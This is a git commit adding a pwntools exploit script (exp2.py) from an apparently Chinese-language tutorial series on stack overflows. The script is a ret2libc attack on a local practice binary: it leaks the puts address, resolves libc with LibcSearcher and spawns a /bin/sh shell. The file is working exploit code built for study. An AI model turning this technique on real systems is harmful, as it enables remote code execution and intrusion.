929fa3cdbb765845b641adb4a19e31e0ec56a252
Mr.Aur0ra <42038237+Mr-Aur0ra@users.noreply.github.com>
2025-05-14 10:58:35 +0800

    Add files via upload

---
+++ 栈溢出/02-Basic ROP/04-ret2libc/ret2libc3/exp2.py
@@ -0,0 +1,28 @@
+from pwn import *
+from LibcSearcher import LibcSearcher
+
+p = process("./ret2libc3")
+elf = ELF('./ret2libc3')
+
+puts_plt = elf.plt['puts']   # puts 函数的 PLT 地址
+_start_addr = elf.symbols['_start']  # _start 是程序的入口函数地址
+libc_puts_got = elf.got['puts']      # puts 函数的 GOT 地址
+
+print("[+]泄露printf()函数地址，并返回程序_start()函数重新执行程序")
+payload = flat([b'A' * 112, puts_plt, _start_addr, libc_puts_got])
+p.sendlineafter(b'Can you find it !?', payload)
+#libc_puts_got的地址会被puts()泄露(打印)出来，recv()接收下即可
+
+print("[+]获取system()函数及字符串/bin/sh的真实地址")
+libc_puts_addr = u32(p.recv()[0:4])  # 读取puts打印的地址
+#print(hex(libc_puts_addr))
+libc = LibcSearcher('puts', libc_puts_addr)    # 用LibcSearcher匹配 libc 库版本
+libcbase = libc_puts_addr - libc.dump('puts')
+system_addr = libcbase + libc.dump('system')
+binsh_addr = libcbase + libc.dump('str_bin_sh')
+
+print("[+]获取系统Shell")
+payload = flat([b'A' * 112, system_addr, b'AAAA', binsh_addr])
+p.sendline(payload)
+
+p.interactive()
